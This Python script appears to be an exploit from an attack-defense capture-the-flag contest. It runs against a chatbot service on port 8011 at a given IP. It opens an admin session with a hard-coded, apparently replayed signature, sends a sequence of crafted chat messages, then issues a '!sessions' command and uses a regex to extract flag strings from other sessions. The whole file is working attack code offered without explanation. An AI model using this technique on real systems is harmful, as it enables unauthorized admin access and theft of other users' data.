#!/usr/bin/python3
# -*- coding: utf-8 -*-
import re, requests
import sys


ip= sys.argv[1]

url = 'http://{}:8011'.format(ip)


parameters = '{"state": "chat\\\\greeting\\\\GreetingState", "extras": "joke,physical-sick,severe-physical-sick,eve,ambulance,physical-sick,sick,morning-chat", "language": "en", "timezone": "America/Managua"}'

signature='N3mzOPWaWsK/M67krE3i/SlObX66MgDtZazd4Cm6u75BDmQlelqwZO29j1qT5Fxru3acMvQSfacIXBZtr8OTnBTQ22iJrRrVeTSZcGL41iRCycAYOvigckW6Uz+hZfJhCIT2scWXnMf1PAloaXRUI+lz+3cgd1lFM7Vz6XDYSgIZNheGRH190ECxPX9TLlq7XH8J/XqUOr1Vw0TbPZNhFrDfQJ7YzohHCLyV8NvDIE1luhK2RGs8EzT4iIovd69roV8p/qE96NfKUlXLuLaCGQ8ycyEAd9ynHorSEmxenfFhE19vtNg/V1MQe37bdp7hGvS+yZtDqGJS90suY68licVMg4lzWM7NTq3O8C1dj/vFhwTu3xkrFWgYVXHn2vvqd15aJTYNdKaeI+CE1Nr92FDVeQtGq5NykIgupa738M5Q1i3dtrzVj/naeyqwdldWeBlM+tzw4A3/gm2mTLN7UyutUwXLBJc4nWswYH4zo6zlKi5dDECOrNb1Lk6FmnByxXx9kxdMZztRl9z6RQAp9WF70ofRWkXp8un+CZZ7E3WjallMJ+ObDVC0XjLMjRLCmJCOnTQkIirowf1eYKmHbN1rf4l2qVn80bJfTNNTPsBqnssO/inzcu4XpkwkpIk37WdctWZF2ITm+2aXUCQlSdQWOTTAE0JD3XnrBCk+5bM='

s = requests.Session()
jsonResponse = s.post(url + '/admin/session/begin?',params={'parameters' : parameters,'signature' : signature}, timeout=(None,None)).json()

session = jsonResponse['session']
secret = jsonResponse['secret']

jsonResponse = s.get(url + '/chat/messages',params={'session' : session,'secret' : secret, 'message' : '!sessions'}, timeout=(None,None)).json()

message="The weather is nice today, isn't it? 🗜"


jsonResponse = s.post(url + '/chat',params={'session' : session.encode('utf-8'),'secret' : secret.encode('utf-8'), 'message' : message.encode('utf-8')}, timeout=(None,None)).text


message="tell me a joke"

jsonResponse = s.post(url + '/chat',params={'session' : session.encode('utf-8'),'secret' : secret.encode('utf-8'), 'message' : message.encode('utf-8')}, timeout=(None,None)).text

message="01101000 01100101 01101100 01101100 01101111 🤖"

jsonResponse = s.post(url + '/chat',params={'session' : session.encode('utf-8'),'secret' : secret.encode('utf-8'), 'message' : message.encode('utf-8')}, timeout=(None,None)).text

#print(jsonResponse)

flags = s.post(url + '/chat',params={'session' : session,'secret' : secret, 'message' : '!sessions'}, timeout=(None,None)).text

print(re.findall('ENO[A-Za-z0-9+/=]{48}',flags), flush=True)